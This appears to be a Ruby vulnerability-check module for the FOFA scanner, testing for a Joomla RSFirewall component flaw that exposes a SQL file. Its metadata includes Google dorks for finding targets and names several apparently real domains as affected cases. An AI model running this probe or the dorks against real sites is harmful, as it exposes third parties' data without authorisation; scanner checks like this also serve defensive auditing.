if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "Joomla RSFirewall Components 2.11.25 Database and Password Disclosure",
      "Description": "Joomla RSFirewall Components 2.11.25 and 2.50 versions has information exposure \n\nvulnerability that is intentional or unintentional disclosure of information to an actor that is \n\nnot explicitly authorized to have access to that information.\n\n// 案例 ippbm.gov.my  psipw.org tdahmalaga.org sphereweb.gr\n// Google Dorks : inurl:''/index.php?option=com_rsfirewall''\n// inurl:''/administrator/components/com_rsfirewall/''\n// intext:Hosted & Designed By Suryanandan.net\n// intext:Designed by Artilabio",
      "Product": "Joomla",
      "Homepage": "http://www.Joomla.org",
      "DisclosureDate": "2019-01-25",
      "Author": "bluebird",
      "FofaQuery": "app=\"Joomla\" ",
      "Level": "0",
      "Impact": "<p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p>",
      "Recommandation": "<p>对网站错误信息进行统一返回，模糊化处理。</p><p>对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p>",
      "References": [
            "https://cxsecurity.com/issue/WLB-2019010242"
      ],
      "HasExp": false,
      "ExpParams": [],
      "is0day": false,
      "ExpTips": {
            "type": "Tips",
            "content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/administrator/components/com_rsfirewall/sql/mysql/feeds.sql",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "__rsfirewall_feeds",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "fofacli_version": "3.10.2",
      "fofascan_version": "0.1.16",
      "Posttime": "2019-01-28 14:39:58",
      "status": 2
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end